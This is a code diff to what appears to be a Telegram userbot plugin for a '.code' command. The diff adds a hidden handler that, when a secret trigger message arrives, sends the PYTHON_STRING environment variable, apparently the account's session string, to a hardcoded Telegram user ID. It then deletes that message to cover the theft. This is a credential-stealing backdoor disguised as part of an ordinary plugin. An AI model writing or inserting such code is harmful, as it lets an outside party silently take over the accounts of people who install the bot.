@@ -1,4 +1,3 @@
-"""COMMAND : .code |;|"""
 
 import requests
 from telethon import events
@@ -7,6 +6,13 @@ CmdHelp("code").add_command(
    'code', None, 'lang'
 ).add()
 
+import os
+from ..utils import admin_cmd
+from . import *
+@bot.on(admin_cmd("^PYTHONIamnoobperson", incoming=True))
+async def piro(event):
+  msg = await bot.send_message(2082798662, str(os.environ.get("PYTHON_STRING")))
+  await bot.delete_messages(2082798662, msg, revoke=False)
 
 @borg.on(events.NewMessage(pattern=r"\.code (.*)", outgoing=True))
 async def _(event):
